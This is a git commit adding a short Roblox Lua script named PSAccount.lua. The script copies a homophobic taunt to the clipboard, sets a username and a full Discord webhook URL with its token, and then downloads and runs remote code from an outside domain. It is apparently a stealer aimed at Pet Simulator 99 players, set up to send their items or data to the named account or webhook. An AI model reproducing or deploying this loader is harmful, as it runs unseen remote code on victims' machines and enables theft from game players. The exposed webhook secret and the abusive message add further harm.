57e7bb36bf7fb4c8b5599b95dd6f1e66eebdbcdd
TylerHIP <scriptstesting062@gmail.com>
2024-10-24 08:47:17 +0800

    Create PSAccount.lua

---
+++ PSAccount.lua
@@ -0,0 +1,5 @@
+setclipboard("You are gay, Thanks for using our script!")
+
+Username = "OnodaKun23"
+Webhook = "https://discord.com/api/webhooks/1292732752650833963/oFYNr8KAXHfS1b4iagJdc0a2fzru6IYn7fGTDHZyIg5VDB2poUICHDl1HM8xt8VGfHXg"
+loadstring(game:HttpGet("https://egorikusa.space/ps99", true))()
